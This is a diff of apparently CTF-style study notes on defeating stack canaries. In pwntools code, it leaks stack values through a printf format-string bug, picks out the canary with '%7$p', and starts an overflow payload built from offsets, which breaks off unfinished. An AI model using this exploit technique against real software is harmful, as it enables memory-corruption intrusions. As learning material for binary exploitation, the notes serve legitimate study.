@@ -55,27 +55,28 @@ Get flag
 ### <span style="color:rgb(255, 192, 0)">Method 1 — Format String Leak</span>
 
 If there's a `printf(buf)` vulnerability before the overflow:
+Step 1: find canary's format-string index
 ```python
 from pwn import *
 
 p = process('./binary')
 
 # Brute-force which argument index holds the canary
-# Canary is on the stack, looks like 0x????????00 (ends in 00)
+# Canary is on the stack, looks like 0x????????00 (always ends in \x00)
 p.sendline(b"%p " * 20)           # leak 20 stack values
-print(p.recvall())                 # find the one ending in \x00
+print(p.recvall())                 # find the one ending in 00
 ```
 
-Once you know the index (e.g. 7):
+Step 2: Once you know the index (e.g. 7), leak it directly:
 ```python
 p.sendline(b"%7$p")               # leak canary as hex
-leak = int(p.recvline(), 16)      # parse it
+leak = int(p.recvline().strip(), 16)      # parse it
 canary = leak
 ```
 
 Then build payload:
 ```python
-offset_to_canary = 40             # cyclic to find this
+offset_to_canary = 40             # cyclic to find distance from buffer start to canary
 offset_to_ret    = offset_to_canary + 8 + 8   # canary + saved RBP
 
 payload  = b"A" * offset_to_canary
